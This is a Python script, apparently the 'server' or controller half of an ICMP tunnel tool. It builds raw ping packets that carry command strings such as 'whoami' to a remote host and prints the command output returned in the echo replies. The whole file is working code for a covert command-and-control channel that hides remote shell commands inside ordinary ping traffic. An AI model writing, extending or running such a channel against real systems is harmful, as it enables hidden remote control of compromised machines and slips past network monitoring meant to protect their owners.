#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Author  : Lemon pineapple 
# @FileName: Server
# @Software: PyCharm


import os
import time
import select
import socket
import struct


def checksum(packet):
    sum =0
    countTo = (len(packet)//2)*2
    count =0
    while count <countTo:
        sum += ((packet[count+1] << 8) | packet[count])
        count += 2
    if countTo<len(packet):
        sum += packet[len(packet) - 1]
        sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send_one_ping(rawsocket, dst_addr, icmp_id, icmp_sq, cmd):
    dst_addr = socket.gethostbyname(dst_addr)
    packet = struct.pack('!BBHHH515s', 8, 0, 0, icmp_id, icmp_sq, cmd)
    chksum=checksum(packet)
    packet = struct.pack('!BBHHH515s', 8, 0, chksum,icmp_id, icmp_sq, cmd)
    send_time = time.time()
    rawsocket.sendto(packet, (dst_addr, 80))
    return send_time,dst_addr

def recv_one_ping(rawsocket,icmp_id, icmp_sq ,time_sent,timeout):
    while True:
        started_select = time.time()
        what_ready = select.select([rawsocket], [], [], timeout)
        how_long_in_select = (time.time() - started_select)
        if what_ready[0] == []:  # Timeout
            return -1
        time_received = time.time()
        received_packet, addr = rawsocket.recvfrom(1024)
        icmpHeader = received_packet[20:28]
        all_icmpHeader = received_packet
        type, code, checksum, packet_id, sequence = struct.unpack(
            "!BBHHH", icmpHeader
        )
        if type == 0 and packet_id == icmp_id and sequence == icmp_sq:
            return (time_received - time_sent, type, code, checksum, packet_id, sequence, all_icmpHeader)
        timeout = timeout - how_long_in_select
        if timeout <= 0:
            return -1

def one_ping(dst_addr,icmp_sq,timeout = 2, cmd=b"|cmd=|"):
    try:
        rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.getprotobyname("icmp"))
    except socket.error as e:
        if e.errno == 1:
            msg = "{0} please run as root ".format(e)
            raise socket.error(msg)
        raise

    icmp_id = os.getpid() & 0xFFFF

    send_time,addr = send_one_ping(rawsocket, dst_addr, icmp_id, icmp_sq, cmd=cmd)
    time, type, code, checksum, packet_id, sequence, all_icmpHeader = recv_one_ping(rawsocket, icmp_id, icmp_sq, send_time, timeout)
    return time, type, code, checksum, packet_id, sequence, addr, all_icmpHeader

def ping(dst_addr,timeout=2, count=3, cmd=b"|cmd=|"):
    for i in range(0,count):
        time, type, code, checksum, packet_id, sequence, addr, all_icmpHeader = one_ping(dst_addr,i+1,timeout,cmd=cmd)
        if time > 0:
            print(time, type, code, checksum, packet_id, sequence, addr, all_icmpHeader[28:])
        else:
            print("来自 {0} 的回复:超时".format(addr))


if __name__=="__main__":
    ping("192.168.56.107",cmd=b"|Rcode|cmd=?whoami?|")